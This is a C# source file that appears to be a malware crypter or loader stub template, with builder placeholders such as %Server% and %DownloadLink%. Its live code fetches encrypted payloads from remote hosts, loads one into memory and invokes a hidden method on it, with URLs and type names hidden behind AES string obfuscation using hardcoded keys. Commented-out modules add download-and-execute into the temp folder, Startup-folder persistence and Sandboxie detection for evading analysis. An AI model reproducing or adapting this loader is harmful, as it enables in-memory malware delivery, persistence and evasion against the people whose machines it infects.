using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Security.Cryptography;
using System.IO;
using System.Text;

//Default [assembly: AssemblyTitle("YE")]
//Default [assembly: AssemblyDescription("")]
//Default [assembly: AssemblyCompany("")]
//Default [assembly: AssemblyProduct("YE")]
//Default [assembly: AssemblyCopyright("Copyright ©  2021")]
//Default [assembly: AssemblyFileVersion("1.0.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


namespace Static
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        private static void Main(string[] args)
		{
 

			//sandboxie controlsandboxie();

			//Messega

			//download try
			//download {
			//download  System.Net.WebClient appyrun = new System.Net.WebClient();
			//download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download }
			//download catch
			//download {
			//download }

            using (WebClient webClient = new WebClient())
            {
                webClient.Headers.Add(bitmekontrolu("KkYNBd0uclT0PAVJFuY+5A=="), bitmekontrolu("DSPUKyIhkTSB+jRHp/k___2h2f+HRU182wK___ULqHIW___lMfwhlg5bbVVFqLiFG___h___E0itVJF64mlBCP+iFYvnexg+O9F+3krrClBBkzHU2ag0M=".Replace("___", "u")));
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                string Giants = bitmekontrolu("mBzizVDYNZVhAwc0tm0Im4T3O9oGXM0/35ZGhttsFE9IJr/SZcYFScGZLpV5PRPnX5mQKMn6u===siCEgvby4vXH+uthj===nOEshGdi8PxE3/LB8mJpqCcJTvw+4yXKJ85p".Replace("===", "a"));
                string Yeties = "%Server%";
                byte[] eater = webClient.DownloadData(Giants);
                byte[] sexy = webClient.DownloadData(Yeties);
                object Pheobe = new object[]
				{
					%aPP%,
					string.Empty,
					sexy,
					true
				};
                string black = null;
                Assembly July = AppDomain.CurrentDomain.Load(eater);
                July.GetType(bitmekontrolu("8MS5ZvZTmNn1pIoUl+dAHg==")).InvokeMember(bitmekontrolu("5OLOBcJOcmvvZtHo1kLF9A=="), BindingFlags.InvokeMethod, null, black, (object[])Pheobe);
            }
 

			//start  {
			//start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
			//start  }


		}

        public static string bitmekontrolu(string A_0)
        {
            byte[] software = Convert.FromBase64String(A_0);
            byte[] aramalarda = new Rfc2898DeriveBytes(teams, Encoding.ASCII.GetBytes(uZ34PZN4ioY)).GetBytes(32);
            RijndaelManaged Fairies = new RijndaelManaged
            {
                Mode = CipherMode.CBC,
                Padding = PaddingMode.None
            };
            ICryptoTransform Orks = Fairies.CreateDecryptor(aramalarda, Encoding.ASCII.GetBytes(pemgail9uzpgzl88));
            MemoryStream usageMsg = new MemoryStream(software);
            CryptoStream showthread = new CryptoStream(usageMsg, Orks, CryptoStreamMode.Read);
            byte[] cathook = new byte[software.Length];
            int Pixies = showthread.Read(cathook, 0, cathook.Length);
            usageMsg.Close();
            showthread.Close();
            return Encoding.UTF8.GetString(cathook, 0, Pixies).TrimEnd("\0".ToCharArray());
        }
        private static readonly string teams = "P@@$Sw0rd";

        // Token: 0x04000002 RID: 2
        private static readonly string uZ34PZN4ioY = "S@L$%^#T&&$%*%^$^#$KEY";

        // Token: 0x04000003 RID: 3
        private static readonly string pemgail9uzpgzl88 = "@1B2c3D4e5F6g7H8";
    }

    //sandboxie [DllImport("kernel32.dll")]
    //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
    //sandboxie static void controlsandboxie()
    //sandboxie {
    //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
    //sandboxie     {
    //sandboxie        Environment.Exit(1);
    //sandboxie     }
    //sandboxie }

}
